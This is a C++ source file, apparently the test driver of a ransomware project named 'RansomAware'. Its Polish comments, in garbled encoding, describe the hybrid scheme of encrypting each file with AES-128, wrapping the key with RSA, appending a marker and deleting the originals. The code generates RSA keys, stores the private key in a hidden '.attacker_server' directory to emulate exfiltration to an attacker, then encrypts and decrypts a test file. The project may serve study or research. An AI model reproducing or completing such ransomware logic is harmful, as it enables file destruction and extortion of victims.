
//#define ENABLE_MAIN

#ifdef ENABLE_MAIN

#include "..\include\include.hpp"
#include "CryptoKeyManager.hpp"
#include "FileEncrypter.hpp"
#include <iostream>
#include <chrono>

//funkcjonalnoœæ tego modu³u szyfrowania:
/*
zaszyfruje wszystkie pliki w podanej lokalizacji w ten sposób, ¿e dla ka¿dego oryginalnego pliku:
    1) wygeneruje klucz AES128 i IV, (funkcja generateAESKeys())
    2) stworzy nowy plik z nazw¹ oryginalnego pliku i rozszerzeniem .raf (funkcja encryptFile(std::string filePath))
    3) na pocz¹tek nowego pliku do³¹czy ci¹g "!RansomAware!" (funkcja encryptFile(std::string filePath))
    4) odczyta ca³y oryginalny plik i zaszyfruje odczytane dane kluczem AES128 (funkcja encryptFile(std::string filePath))
    5) zaszyfruje klucz AES128 kluczem publicznym m_rsaKey (funkcja encryptAESKey())
    6) dopisze do nowego pliku zaszyfrowany klucz AES128 (funkcja encryptFile(std::string filePath))
    7) dopisze zaszyfrowane oryginalne dane do utworzonego w pkt. 4) pliku (funkcja encryptFile(std::string filePath))
    g) usunie oryginalny plik (funkcja encryptFile(std::string filePath))
*/

int main(int argc, char* argv[])
{
    if (not dbg::initLogs())
    {
		DBG_PRINT("Console initialization failed");
		utils::stopAndExit(EXIT_FAILURE);
	}

    //Create hidden directory to store temporary RSA keys (emulate connection to attacker server)
    auto workingDir = std::string(*argv); workingDir = workingDir.substr(0, workingDir.find_last_of('\\') + 1);
    auto rsaDir = workingDir + _(".attacker_server\\");
    if (not utils::createDir(rsaDir, true))
    {
        DBG_PRINT("Cannot create hidden directory: %s", rsaDir.c_str());

        DBG_PRINT("Creating normal directory instead");
        if (not utils::createDir(rsaDir, false))
        {
			DBG_PRINT("Cannot create directory: %s", rsaDir.c_str());
            utils::stopAndExit(EXIT_FAILURE);
		}
    }

    auto& keyMgr = CryptoKeyManager::getInstance();

    //Generate RSA keys
    if (not keyMgr.generateRSAKey())
    {
        DBG_PRINT("Cannot generate RSA keys");
        utils::stopAndExit(EXIT_FAILURE);
    }

    //Save private key to hidden dir (emulate sending private key to attacker server)
    auto userId = utils::getSystemUserName() + utils::genRandomString(6);
    auto fileName = std::string(_("private_")) + userId + _(".pam");
    if (not keyMgr.sendKeysTo(rsaDir + fileName))
    {
        DBG_PRINT("Cannot save private key");
        utils::stopAndExit(EXIT_FAILURE);
    }

    //Destroy private key
    if (not keyMgr.destroyPrivateKey())
    {
        DBG_PRINT("Cannot destroy private key: %s", keyMgr.getLastError().c_str());
        utils::stopAndExit(EXIT_FAILURE);
    }

    //Read private key from hidden dir (emulate receiving private key from attacker server)
    if (not keyMgr.receivePrivateKeyFrom(rsaDir + fileName))
    {
        DBG_PRINT("Cannot read private key");
        utils::stopAndExit(EXIT_FAILURE);
    }

#pragma region AES_TEST

    //Generate AES key
 //   CryptoKeyManager::AESKey aes;
 //   if (not keyMgr.generateAESKey(&aes))
 //   {
	//	DBG_PRINT("Cannot generate AES key");
	//	utils::stopAndExit(EXIT_FAILURE);
	//}

    //Encrypt AES key
 //   DBG_PRINT("Generated AES [encrypted: %d]: ", aes.isEncrypted());
 //   std::cout << aes << std::endl;

 //   if (not keyMgr.encryptAESKey(&aes))
 //   {
	//	DBG_PRINT("Cannot encrypt AES key");
	//	utils::stopAndExit(EXIT_FAILURE);
	//}

 //   DBG_PRINT("Encrypted AES [encrypted: %d]: ", aes.isEncrypted());
 //   std::cout << aes << std::endl;

    //Decrypt AES key
    //if (not keyMgr.decryptAESKey(&aes))
    //{
    //    DBG_PRINT("Cannot decrypt AES key");
    //    utils::stopAndExit(EXIT_FAILURE);
    //}

    //DBG_PRINT("Decrypted AES [encrypted: %d]: ", aes.isEncrypted());
    //std::cout << aes << std::endl;

#pragma endregion AES_TEST

    auto& fileEnctrypter = FileEncrypter::getInstance();
    fileEnctrypter.init(keyMgr);

    const char* testFile = "test_file.txt";
    const char* testFileEncrypted = "test_file.txt.RAF!";

    std::string sha256;
    if (fileEnctrypter.computeFileSHA256(rsaDir + testFile, &sha256))
        DBG_PRINT("SHA256 before encrypting file: %s", sha256.c_str());

    auto timerStart = std::chrono::high_resolution_clock::now();

    // Encrypt files
    if (not fileEnctrypter.encryptFile(rsaDir + testFile))
    {
        DBG_PRINT("Cannot encrypt file");
        utils::stopAndExit(EXIT_FAILURE);
    }

    auto timerEnd = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(timerEnd - timerStart).count();
    DBG_PRINT("Encryption time: %lld ms", duration);

    if (fileEnctrypter.computeFileSHA256(rsaDir + testFile, &sha256))
		DBG_PRINT("SHA256 after encrypting file: %s", sha256.c_str());

    system("pause");

    timerStart = std::chrono::high_resolution_clock::now();

    // Decrypt file
    if (not fileEnctrypter.decryptFile(rsaDir + testFileEncrypted))
    {
		DBG_PRINT("Cannot decrypt file");
		utils::stopAndExit(EXIT_FAILURE);
	}

    timerEnd = std::chrono::high_resolution_clock::now();
    duration = std::chrono::duration_cast<std::chrono::milliseconds>(timerEnd - timerStart).count();
    DBG_PRINT("Decryption time: %lld ms", duration);

    if (fileEnctrypter.computeFileSHA256(rsaDir + testFile, &sha256))
        DBG_PRINT("SHA256 after decrypting file: %s", sha256.c_str());

    utils::stopAndExit(EXIT_SUCCESS);
}

#endif // _DEBUG